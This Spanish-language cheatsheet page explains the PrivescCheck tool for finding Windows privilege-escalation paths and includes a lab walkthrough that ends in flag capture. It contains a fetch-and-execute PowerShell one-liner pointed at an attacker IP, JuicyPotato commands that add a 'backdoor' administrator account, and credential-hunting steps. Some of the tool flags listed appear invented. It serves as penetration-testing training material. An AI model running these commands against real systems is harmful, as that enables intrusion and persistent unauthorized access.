
# Privesc Check

## <mark style="color:purple;">Privesc Check</mark>

**PrivescCheck** es un script de PowerShell diseñado específicamente para la enumeración de vectores de escalada de privilegios en sistemas Windows. Es una alternativa moderna y más completa a PowerUp, con mejor detección y menos falsos positivos.

{% embed url="<https://github.com/itm4n/PrivescCheck>" %}

#### Características Principales

* **No requiere** privilegios de administrador para ejecutarse
* Enumeración exhaustiva de vectores de privesc
* Salida formateada con colores para fácil lectura
* Detección de vulnerabilidades conocidas (CVE)
* Búsqueda de credenciales en archivos y registro
* Análisis de permisos en servicios, tareas, y binarios

#### Instalación y Carga

```bash
# Descargar PrivescCheck en Kali
git clone https://github.com/itm4n/PrivescCheck.git
cd PrivescCheck
python3 -m http.server 80

# Método 1: Descargar directamente en memoria
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP-Atacante>/PrivescCheck.ps1'); Invoke-PrivescCheck"

# Método 2: Subir archivo y ejecutar
upload /root/PrivescCheck/PrivescCheck.ps1
powershell -exec bypass
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

### Comandos y Ejemplos Prácticos

#### **1. Invoke-PrivescCheck - Escaneo Completo**

El comando principal que ejecuta todas las comprobaciones:

```powershell
# Escaneo básico
Invoke-PrivescCheck

# Escaneo con salida detallada
Invoke-PrivescCheck -Extended

# Escaneo con salida en formato HTML
Invoke-PrivescCheck -Report PrivescReport.html

# Escaneo con verbosidad máxima
Invoke-PrivescCheck -Verbose -Debug
```

**Ejemplo de salida:**

```powershell
=== PrivescCheck v3.0 ===
[*] Running checks...
[+] Current user: lowuser
[+] User privileges: SeChangeNotifyPrivilege, SeShutdownPrivilege

[!] Service: VulnService
    - Path: C:\Program Files\Vuln\vuln.exe
    - Modifiable by: BUILTIN\Users (Write)
    - Abuse: Write to binary and restart service

[+] AlwaysInstallElevated: Enabled
    - Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    - Value: AlwaysInstallElevated = 1
```

#### **2. Enumeración de Usuario y Privilegios**

```bash
# Ver información del usuario actual
Invoke-PrivescCheck -CheckUserInfo

# Enumerar grupos del usuario
Invoke-PrivescCheck -CheckUserGroups

# Ver privilegios asignados
Invoke-PrivescCheck -CheckUserPrivileges
```

#### **3. Servicios y Binarios**

```bash
# Encontrar servicios con permisos débiles
Invoke-PrivescCheck -CheckServices

# Buscar binarios de servicios modificables
Invoke-PrivescCheck -CheckModifiableServices

# Servicios con rutas sin comillas
Invoke-PrivescCheck -CheckUnquotedServicePaths
```

#### **4. Tareas Programadas**

```bash
# Enumerar tareas programadas
Invoke-PrivescCheck -CheckScheduledTasks

# Buscar tareas ejecutadas como SYSTEM
Invoke-PrivescCheck -CheckScheduledTasks -Verbose
```

#### **5. AlwaysInstallElevated**

```bash
# Verificar política AlwaysInstallElevated
Invoke-PrivescCheck -CheckAlwaysInstallElevated
```

#### **6. DLL Hijacking y Búsqueda de DLLs**

```bash
# Buscar DLLs faltantes
Invoke-PrivescCheck -CheckDLLHijacking

# Buscar rutas de DLLs modificables
Invoke-PrivescCheck -CheckModifiableDLLs
```

#### **7. Credenciales en Archivos y Registro**

```bash
# Buscar credenciales en archivos
Invoke-PrivescCheck -CheckCredentialFiles

# Buscar en archivos de configuración
Invoke-PrivescCheck -CheckInterestingFiles

# Buscar autologon en registro
Invoke-PrivescCheck -CheckAutoLogon

# Buscar contraseñas en registro
Invoke-PrivescCheck -CheckRegistryPasswords
```

#### **8. Vulnerabilidades Conocidas (CVEs)**

```bash
# Buscar CVEs específicos
Invoke-PrivescCheck -CheckCVEs

# Verificar vulnerabilidades específicas
Invoke-PrivescCheck -CheckMS16-032  # Secondary Logon
Invoke-PrivescCheck -CheckMS17-010  # EternalBlue
```

#### **9. Explotación con Potato**

```powershell
# Verificar si el usuario tiene SeImpersonatePrivilege
Invoke-PrivescCheck -CheckUserPrivileges | Select-String "SeImpersonatePrivilege"

# Si está presente, usar JuicyPotato
# Subir JuicyPotato
upload /root/JuicyPotato.exe

# Explotar
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user backdoor Pass123! /add" -t *
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators backdoor /add" -t *
```

***

## <mark style="color:purple;">Lab: Privesc Check</mark>

Este laboratorio cubre el uso del script [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck) para encontrar una vulnerabilidad común de escalada de privilegios en Windows. El script **PrivescCheck** enumera problemas comunes de configuración de Windows que pueden aprovecharse para la escalada de privilegios local. También recopila diversa información que puede ser útil para la explotación y/o post-explotación.

#### Hosts

Nuestro objetivo es `demo.ine.local`:

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.12       attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.49.7      attackdefense.com attackdefense
10.2.23.1    demo.ine.local
```

En este laboratorio podemos alternar fácilmente entre la máquina Kali y la máquina Windows objetivo y tenemos el script disponible en el escritorio de la máquina Windows:

<figure><img src="/files/yvPdv8esVPiy3hvylNq7" alt=""><figcaption></figcaption></figure>

### Importar módulo y ejecutar

```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

Eso nos muestra muchísima información, incluyendo unas credenciales expuesta de administrador:

<figure><img src="/files/JddCGos6wFdlDmU56UPD" alt=""><figcaption></figcaption></figure>

DLLs hijackeables:

<figure><img src="/files/sXfrGaeVt6UICNQo5RzY" alt=""><figcaption></figcaption></figure>

Y un reporte completo:

<figure><img src="/files/ZfoWAKlOeuiSKsPltj80" alt=""><figcaption></figcaption></figure>

### Runas como admin

```powershell
runas.exe /user:administrator cmd
```

<figure><img src="/files/bwZ5KDqArnr3LkVlgQez" alt=""><figcaption></figcaption></figure>

### Acceso a la flag

```powershell
C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 9E32-0E96

Directory of C:\Users\Administrator\Desktop

06/15/2021 11:45 AM    <DIR>          .
06/15/2021 11:45 AM    <DIR>          ..
06/15/2021 11:46 AM               32 flag.txt

               1 File(s)             32 bytes
               2 Dir(s)  15,970,131,968 bytes free

C:\Users\Administrator\Desktop> type flag.txt
2b070a650a92129c2462deae********
```

### Acceso desde Kali

Podemos usar las misma técnicas que en la sección anterior para acceder al equipo Windows desde Kali Linux usando `impacket-psexec` o el `HTA Server` de Metasploit.

{% content-ref url="/pages/gHaF6vUed8SWp2pWQHGA#explotacion-desde-kali-hta-server" %}
[Windows Privilege Escalation Scripts](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/windows-privilege-escalation/windows-privilege-escalation-scripts.md#explotacion-desde-kali-hta-server)
{% endcontent-ref %}
